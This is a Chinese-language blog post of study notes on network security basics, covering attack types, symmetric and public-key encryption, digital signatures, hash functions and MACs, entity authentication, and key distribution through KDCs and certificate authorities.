<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="[TOC] 网络安全网络安全问题概述1. 网络攻击计算机网络上的通信面临以下两大类威胁：被动攻击和主动攻击。 被动攻击：指攻击者从网络上窃听他人的通信内容，通常把这类攻击称为截获。在被动攻击中，攻击者只是观察和分析某一个协议数据单元 PDU，以便了解所交换的数据的某种性质。但不干扰信息流。这种被动攻击又称为流量分析 (traffic analysis)。   主动攻击主要有：  篡改：故意篡改网络">
<meta property="og:type" content="article">
<meta property="og:title" content="ShiftJava&#x2F;C 网络&#x2F;G 网络安全">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;index.html">
<meta property="og:site_name" content="路漫漫其修远兮">
<meta property="og:description" content="[TOC] 网络安全网络安全问题概述1. 网络攻击计算机网络上的通信面临以下两大类威胁：被动攻击和主动攻击。 被动攻击：指攻击者从网络上窃听他人的通信内容，通常把这类攻击称为截获。在被动攻击中，攻击者只是观察和分析某一个协议数据单元 PDU，以便了解所交换的数据的某种性质。但不干扰信息流。这种被动攻击又称为流量分析 (traffic analysis)。   主动攻击主要有：  篡改：故意篡改网络">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574750667503.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574751118107.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574751456904.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574751638039.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574751791422.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574752002800.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574752073918.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574752501649.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574752656810.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574752913419.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574753036305.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574753179454.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574753070999.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574753485505.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574756070267.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574756133969.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574756486826.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574756662496.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574756741778.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574756922976.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574767301364.png">
<meta property="og:updated_time" content="2021-01-06T11:22:32.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;07&#x2F;ShiftJava&#x2F;C%20%E7%BD%91%E7%BB%9C&#x2F;G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&#x2F;assets&#x2F;1574750667503.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"right","wideth":200,"display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":true},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":1},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2021/08/07/ShiftJava/C 网络/G 网络安全/"/>





  <title>ShiftJava/C 网络/G 网络安全 | 路漫漫其修远兮</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-right page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">路漫漫其修远兮</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/08/07/ShiftJava/C%20%E7%BD%91%E7%BB%9C/G%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yue">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="路漫漫其修远兮">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">ShiftJava/C 网络/G 网络安全</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-08-07T19:04:14+08:00">
                2021-08-07
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
            </span>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>[TOC]</p>
<h3 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h3><h4 id="网络安全问题概述"><a href="#网络安全问题概述" class="headerlink" title="网络安全问题概述"></a>网络安全问题概述</h4><h5 id="1-网络攻击"><a href="#1-网络攻击" class="headerlink" title="1. 网络攻击"></a>1. 网络攻击</h5><p>计算机网络上的通信面临以下两大类威胁：<strong>被动攻击和主动攻击</strong>。</p>
<p><strong>被动攻击</strong>：指攻击者从网络上<strong>窃听</strong>他人的通信内容，通常把这类攻击称为<strong>截获</strong>。在被动攻击中，攻击者只是观察和分析某一个协议数据单元 PDU，以便了解所交换的数据的某种性质。但不干扰信息流。这种被动攻击又称为流量分析 (traffic analysis)。</p>
<img src="assets/1574750667503.png" alt="1574750667503" style="zoom:40%;" />

<p><strong>主动攻击</strong>主要有：</p>
<ul>
<li><strong>篡改</strong>：故意篡改网络上传送的报文。这种攻击方式有时也称为更改报文流。</li>
<li><strong>恶意程序</strong>：种类繁多，对网络安全威胁较大的主要包括：计算机病毒、计算机蠕虫、特洛伊木马、逻辑炸弹、后门入侵、流氓软件等。</li>
<li><strong>拒绝服务</strong> <strong>DoS</strong>：指攻击者向互联网上的某个服务器不停地发送大量分组，使该服务器无法提供正常服务，甚至完全瘫痪。若从互联网上的成百上千的网站集中攻击一个网站，则称为分布式拒绝服务 DDoS。</li>
</ul>
<h5 id="2-数据加密模型"><a href="#2-数据加密模型" class="headerlink" title="2. 数据加密模型"></a>2. <strong>数据加密模型</strong></h5><p><strong>加密和解密</strong>用的<strong>密钥K</strong> (key) 是一串秘密的字符串（即比特串）。明文通过加密算法 E  和加密密钥 K  变成密文。接收端利用解密算法 D 运算和解密密钥 K  解出明文 X。解密算法是加密算法的<strong>逆运算</strong>。加密密钥和解密密钥可以一样，也可以<strong>不一样</strong>。当密钥需要向远地传送时，一定要通过另一个安全信道。</p>
<img src="assets/1574751118107.png" alt="1574751118107" style="zoom:45%;" />



<h4 id="两类密码体制"><a href="#两类密码体制" class="headerlink" title="两类密码体制"></a>两类密码体制</h4><h5 id="1-对称密钥密码体制"><a href="#1-对称密钥密码体制" class="headerlink" title="1. 对称密钥密码体制"></a>1. 对称密钥密码体制</h5><h6 id="1-概述"><a href="#1-概述" class="headerlink" title="(1) 概述"></a>(1) 概述</h6><p>所谓常规密钥密码体制，即<strong>加密密钥与解密密钥是相同的密码体制</strong>，这种加密系统又称为<strong>对称密钥</strong>系统。</p>
<img src="assets/1574751456904.png" alt="1574751456904" style="zoom: 45%;" />

<p>数据加密标准 DES 属于<strong>对称密钥密码体制</strong>，是一种<strong>分组密码</strong>。在加密前，先对整个明文进行分组。每一个组长为 64 位。然后对每一个 64 位 二进制数据进行加密处理，产生一组 64 位密文数据。最后将各组密文串接起来，即得出整个的密文。使用的密钥为 64 位（<strong>实际密钥长度为 56 位</strong>，有 8 位用于奇偶校验)。 DES 的<strong>保密性仅取决于对密钥的保密</strong>，其<strong>算法是公开</strong>的。目前较为严重的问题是 DES 的密钥的长度。现在已经设计出搜索 DES 密钥的专用芯片。56 位 <strong>DES 已不再认为是安全</strong>的了。 </p>
<h6 id="2-三重DES"><a href="#2-三重DES" class="headerlink" title="(2) 三重DES"></a>(2) 三重DES</h6><p>使用两个 56 位的密钥。把一个 64 位明文用一个密钥加密，再用另一个密钥解密，然后再使用第一个密钥加密。</p>
<img src="assets/1574751638039.png" alt="1574751638039" style="zoom:40%;" />

<h5 id="2-公钥密码体制"><a href="#2-公钥密码体制" class="headerlink" title="2. 公钥密码体制"></a>2. 公钥密码体制</h5><h6 id="1-概述-1"><a href="#1-概述-1" class="headerlink" title="(1) 概述"></a>(1) 概述</h6><p>公钥密码体制（又称为<strong>公开密钥密码</strong>体制）使用<strong>不同的加密密钥与解密密钥</strong>，是一种“由已知加密密钥推导出解密密钥在计算上是不可行的”密码体制。 </p>
<p>公钥密码体制产生的主要原因：常规密钥密码体制的密钥分配问题，以及对<strong>数字签名</strong>的需求。</p>
<p>在公钥密码体制中，<strong>加密密钥 PK</strong>（public key，即公钥）是向公众<strong>公开</strong>的，而<strong>解密密钥 SK</strong>（secret key，即私钥或秘钥）则是需要<strong>保密</strong>的。加密算法 E 和解密算法 D 也都是<strong>公开</strong>的。虽然私钥 SK 是由公钥 PK 决定的，但却<strong>不能</strong>根据 PK 计算出 SK。 </p>
<h6 id="2-公钥算法"><a href="#2-公钥算法" class="headerlink" title="(2) 公钥算法"></a>(2) 公钥算法</h6><p>密钥对<strong>产生器</strong>产生出接收者 B 的一对密钥：<strong>加密密钥 PKB 和解密密钥 SKB</strong> 。加密密钥 PKB 就是接收者 B 的<strong>公钥</strong>，它向公众<strong>公开</strong>。解密密钥 SKB 就是接收者 B 的<strong>私钥</strong>，对其他人都<strong>保密</strong>。发送者 A 用 B 的公钥 PKB 对明文 X 加密（E 运算）后，接收者 B 用自己的私钥 SKB 解密（D 运算），即可恢复出明文。</p>
<img src="assets/1574751791422.png" alt="1574751791422" style="zoom:45%;" />

<h6 id="3-公开密钥与对称密钥的区别"><a href="#3-公开密钥与对称密钥的区别" class="headerlink" title="(3) 公开密钥与对称密钥的区别"></a>(3) 公开密钥与对称密钥的区别</h6><p>在使用<strong>对称密钥</strong>时，由于双方使用同样的密钥，因此在通信信道上可以进行<strong>一对一的双向保密通信</strong>，每一方既可用此密钥加密明文，并发送给对方，也可接收密文，用同一密钥对密文解密。这种保密通信仅限于持有此密钥的双方（如再有第三方就不保密了）。在使用<strong>公开密钥</strong>时，在通信信道上可以是<strong>多对一的单向保密通信</strong>。</p>
<h4 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h4><h5 id="1-概述-2"><a href="#1-概述-2" class="headerlink" title="1. 概述"></a>1. 概述</h5><p>数字签名用于证明<strong>真实性</strong>。数字签名必须保证以下三点：</p>
<ul>
<li><strong>报文鉴别</strong>：接收者能够核实发送者对报文的签名（<strong>证明来源</strong>）；</li>
<li><strong>报文的完整性</strong>：发送者事后不能抵赖对报文的签名（<strong>防否认</strong>）；</li>
<li><strong>不可否认</strong>：接收者不能伪造对报文的签名（<strong>防伪造</strong>）。</li>
</ul>
<p>现在已有多种实现各种数字签名的方法。<strong>但采用公钥算法更容易实现</strong>。 </p>
<img src="assets/1574752002800.png" alt="1574752002800" style="zoom:40%;" />

<h5 id="2-基于公钥的数字签名的实现"><a href="#2-基于公钥的数字签名的实现" class="headerlink" title="2. 基于公钥的数字签名的实现"></a>2. 基于公钥的数字签名的实现</h5><p>A 具有自己的<strong>私钥</strong>，所以除 A 外没有别人能产生这个密文。因此 B 相信报文 X 是 A 签名发送的。若 A 要抵赖曾发送报文给 B，<strong>B 可将明文和对应的密文出示给第三者</strong>。第三者很容易用 A 的<strong>公钥去证实</strong> A 确实发送 X 给 B。反之，若 B 将 X 伪造成 X’，则 B 不能在第三者前出示对应的密文。这样就证明了 <strong>B 伪造</strong>了报文。 </p>
<h5 id="3-具有保密性的数字签名"><a href="#3-具有保密性的数字签名" class="headerlink" title="3. 具有保密性的数字签名"></a>3. 具有保密性的数字签名</h5><img src="assets/1574752073918.png" alt="1574752073918" style="zoom:45%;" />



<h4 id="鉴别"><a href="#鉴别" class="headerlink" title="鉴别"></a>鉴别</h4><p>在信息的安全领域中，对付<strong>被动攻击</strong>的重要措施是<strong>加密</strong>，而对付<strong>主动攻击</strong>中的<strong>篡改和伪造</strong>则要用<strong>鉴别</strong> (authentication)。<br>报文鉴别使得通信的接收方能够验证所收到的报文（发送者和报文内容、发送时间、序列等）的<strong>真伪</strong>。使用<strong>加密</strong>就可达到<strong>报文鉴别</strong>的目的。但在网络的应用中，许多报文<strong>并不需要</strong>加密。应当使接收者能用很<strong>简单的方法</strong>鉴别报文的真伪。 </p>
<p><strong>鉴别分类：</strong></p>
<ul>
<li><strong>报文鉴别</strong>：即鉴别所收到的报文的确是报文的<strong>发送者</strong>所发送的，而不是其他人伪造的或篡改的。这就包含了<strong>端点鉴别和报文完整性</strong>的鉴别。</li>
<li><strong>实体鉴别</strong>：仅仅鉴别发送报文的<strong>实体</strong>。实体可以是一个人，也可以是一个进程（客户或服务器）。这就是<strong>端点鉴别</strong>。</li>
</ul>
<h5 id="1-报文鉴别"><a href="#1-报文鉴别" class="headerlink" title="1. 报文鉴别"></a>1. 报文鉴别</h5><p>许多报文<strong>并不需要加密</strong>，但却需要<strong>数字签名</strong>，以便让报文的<strong>接收者</strong>能够鉴别报文的<strong>真伪</strong>。然而对很长的报文进行数字签名会使计算机增加很大的<strong>负担</strong>（需要进行很长时间的运算）。当我们传送不需要加密的报文时，应当使接收者能用<strong>很简单</strong>的方法鉴别报文的真伪。</p>
<h6 id="1-密码散列函数"><a href="#1-密码散列函数" class="headerlink" title="(1) 密码散列函数"></a>(1) 密码散列函数</h6><p><strong>数字签名</strong>就能够实现对报文的<strong>鉴别</strong>。但这种方法有一个很大的<strong>缺点</strong>：对较长的报文（这是很常见的）进行数字签名会使计算机增加非常大的负担，因为这需要<strong>较多的时间</strong>来进行运算。<strong>密码散列函数</strong> (cryptographic hash function)是一种<strong>相对简单</strong>的对<strong>报文进行鉴别</strong>的方法。</p>
<img src="assets/1574752501649.png" alt="1574752501649" style="zoom:40%;" />

<p>散列函数的输入长度可以很长，但其<strong>输出长度则是固定</strong>的，并且较短。散列函数的输出叫做<strong>散列值</strong>，或称为散列。<br>不同的散列值肯定对应于不同的输入，但不同的输入却可能得出相同的散列值。这就是说散列函数的输入和输出并非一一对应，而是<strong>多对一</strong>的。在密码学中使用的散列函数称为密码散列函数。具有<strong>单向性</strong>的特点。要找到两个不同的报文，它们具有同样的密码散列函数输出，在计算上是不可行的。也就是说，<strong>密码散列函数实际上是一种单向函数</strong> (one-way function)。</p>
<h6 id="2-密码散列函数MD5和SHA"><a href="#2-密码散列函数MD5和SHA" class="headerlink" title="(2) 密码散列函数MD5和SHA"></a>(2) 密码散列函数MD5和SHA</h6><p>通过许多学者的不断努力，已经设计出一些<strong>实用的密码散列函数</strong>（或称为<strong>散列算法</strong>），其中最出名的就是 <strong>MD5 和 SHA-1</strong>。SHA-1比 MD5 更安全，但计算起来却比 MD5 要慢些。</p>
<p><strong>MD5 报文摘要算法</strong></p>
<p><strong>MD5</strong> 是报文摘要 MD (Message Digest) 的第 5 个版本。MD5 的设计者 Rivest 曾提出一个猜想，即根据给定的 MD5 报文摘要代码，要找出一个与原来报文有相同报文摘要的另一报文，其难度在计算上几乎是不可能的。</p>
<p>基本思想：用足够复杂的方法将报文的数据位<strong>充分“弄乱</strong>”，报文摘要代码中的<strong>每一位</strong>都与<strong>原来报文中的每一位有关</strong>。</p>
<p>MD5 实现的报文鉴别<strong>可以防篡改</strong>，但<strong>==不能防伪造==</strong>，因而不能真正实现报文鉴别。</p>
<p><strong>MD5 计算步骤</strong></p>
<ol>
<li><strong>附加</strong>：把任意长的报文按模 264 计算其余数（64位），追加在报文的后面（长度项）。</li>
<li><strong>填充</strong>：在报文和长度项之间填充 1～512 位，使得填充后的总长度是 512 的整数倍。填充的首位是 1，后面都是 0。</li>
</ol>
<img src="assets/1574752656810.png" alt="1574752656810" style="zoom:46%;" />

<ol start="3">
<li><strong>分组</strong>：把追加和填充后的报文分割为一个个 512 位的数据块，每个 512 位的报文数据再分成 4 个 128 位的数据块。</li>
<li><strong>计算</strong>：将 4 个 128 位的数据块依次送到不同的散列函数进行 4 轮计算。每一轮又都按 32 位的小数据块进行复杂的运算。一直到最后计算出 MD5 报文摘要代码（128 位）。</li>
</ol>
<p><strong>SHA 安全散列算法：</strong>SHA 比 MD5 更安全，已制定 SHA-1、SHA-2、 SHA-3 等版本。现在用的基本都是高版本的。</p>
<h6 id="3-报文鉴别码MAC"><a href="#3-报文鉴别码MAC" class="headerlink" title="(3) 报文鉴别码MAC"></a>(3) 报文鉴别码MAC</h6><p>MD5 实现的报文鉴别可以<strong>防篡改</strong>，但<strong>不能防伪造</strong>，因而<strong>不能真正实现报文鉴别</strong>。例如：</p>
<p>(1) 入侵者创建了一个伪造的报文 M，然后计算出其散列 H(M )，并把拼接有散列的扩展报文冒充 A 发送给 B。<br>(2) B 收到扩展的报文 (M, H(M )) 后， 通过散列函数的运算，计算出收到的报文 MR 的散列 H(MR)。<br>(3) 若 H(M ) = H(MR)，则 B 就会误认为所收到的伪造报文就是 A 发送的。</p>
<p>为防范上述攻击，可以<strong>对散列进行一次加密</strong>。散列加密后的结果叫做<strong>报文鉴别码 MAC</strong> (Message Authentication Code)。由于入侵者不掌握密钥 K，所以入侵者无法伪造 A 的报文鉴别码 MAC，因而无法伪造 A 发送的报文。这样就<strong>完成了对报文的鉴别</strong>。</p>
<img src="assets/1574752913419.png" alt="1574752913419" style="zoom: 50%;" />

<p>所以现在<strong>整个</strong>的报文是<strong>不需要加密</strong>的。虽然从散列 H 导出报文鉴别码 MAC 需要加密算法，但由于散列 H 的长度通常都远远小于报文 X 的长度，因此这种加密<strong>不会消耗</strong>很多的计算资源。因此，使用<strong>鉴别码 MAC 就能够很方便地保护报文的完整性</strong>。</p>
<h5 id="2-实体鉴别"><a href="#2-实体鉴别" class="headerlink" title="2. 实体鉴别"></a>2. 实体鉴别</h5><p>实体鉴别与报文鉴别不同。报文鉴别是对<strong>每一个</strong>收到的<strong>报文</strong>都要鉴别报文的发送者。<strong>实体鉴别</strong>是在系统接入的全部持续<strong>时间内</strong>对和自己通信的对方实体<strong>只需验证一次</strong>。 </p>
<p><strong>使用不重数进行鉴别</strong></p>
<p>在使用公钥密码体制时，可以对<strong>不重数</strong>进行签名鉴别。B 用其<strong>私钥对不重数</strong> <strong>RA</strong> 进行签名后发回给 A。A 用 B 的公钥核实签名。如能得出自己原来发送的不重数 <strong>RA</strong>，就核实了和自己通信的对方的确是 B。同样，A 也用自己的<strong>私钥对不重数</strong> <strong>RB</strong> 进行签名后发送给 B。B 用 A 的公钥核实签名，鉴别了 A 的身份。公钥密码体制虽然不必在互相通信的用户之间秘密地分配共享密钥，但<strong>仍有</strong>受到攻击的可能。</p>
<img src="assets/1574753036305.png" alt="1574753036305" style="zoom:45%;" />

<p>如下面的<strong>中间人</strong>攻击。A 向 B 发送“我是 A”的报文，并给出了自己的身份。此报文被 “中间人” C 截获，C 把此报文原封不动地转发给 B。B 选择一个不重数 RB 发送给 A，但同样被 C 截获后也照样转发给 A。<br>中间人 C 用自己的私钥 SKC 对 RB 加密后发回给 B，使 B 误以为是 A 发来的。A 收到 RB 后也用自己的私钥 SKA 对 RB 加密后发回给 B，中途被 C 截获并丢弃。B 向 A 索取其公钥，此报文被 C 截获后转发给 A。</p>
<img src="assets/1574753179454.png" alt="1574753179454" style="zoom:45%;" />

<p><strong>使用公钥体制进行不重数鉴别</strong></p>
<img src="assets/1574753070999.png" alt="1574753070999" style="zoom:40%;" />



<h4 id="密钥分配"><a href="#密钥分配" class="headerlink" title="密钥分配"></a>密钥分配</h4><h5 id="1-对称密钥的分配"><a href="#1-对称密钥的分配" class="headerlink" title="1. 对称密钥的分配"></a>1. 对称密钥的分配</h5><p>目前常用的密钥分配方式是设立<strong>密钥分配中心 KDC</strong> (Key Distribution Center)。KDC 是大家都信任的机构，其任务就是给需要进行秘密通信的用户临时分配一个会话密钥（<strong>仅使用一次</strong>）。假设用户 A 和 B 都是 KDC 的登记用户，并已经在 KDC 的服务器上安装了各自和 KDC 进行通信的主密钥（master key）KA 和 KB。 “<strong>主密钥”可简称为“密钥”</strong>。</p>
<img src="assets/1574753485505.png" alt="1574753485505" style="zoom:50%;" />

<p>说明：为防止重放攻击，KDC 还可在报文中加入<strong>时间戳</strong>。会话密钥 KAB 是<strong>一次性</strong>的，因此保密性较高。KDC 分配给用户的密钥 KA 和 KB，应<strong>定期更换</strong>，以减少攻击者破译密钥的机会。目前最出名的<strong>密钥分配协议是 Kerberos V5</strong>。</p>
<h5 id="2-公钥的分配"><a href="#2-公钥的分配" class="headerlink" title="2. 公钥的分配"></a>2. 公钥的分配</h5><p>在<strong>公钥密码体制</strong>中，如果<strong>每个用户都具有其他用户的公钥</strong>，就可实现安全通信。但不能随意公布用户的公钥，因为无法防止假冒和欺骗。使用者也无法确定公钥的真正拥有者。</p>
<p>需要有一个值得信赖的机构：<strong>即认证中心 CA</strong> (Certification Authority)，来将<strong>公钥</strong>与其对应的<strong>实体</strong>（人或机器）进行<strong>绑定</strong> (binding)。每个<strong>实体</strong>都有 <strong>CA  发来的证书</strong> (certificate)，里面有公钥及其拥有者的标识信息。此<strong>证书被 CA 进行了数字签名，是不可伪造</strong>的，可以信任。证书是一种身份证明，用于解决<strong>信任问题</strong>。</p>
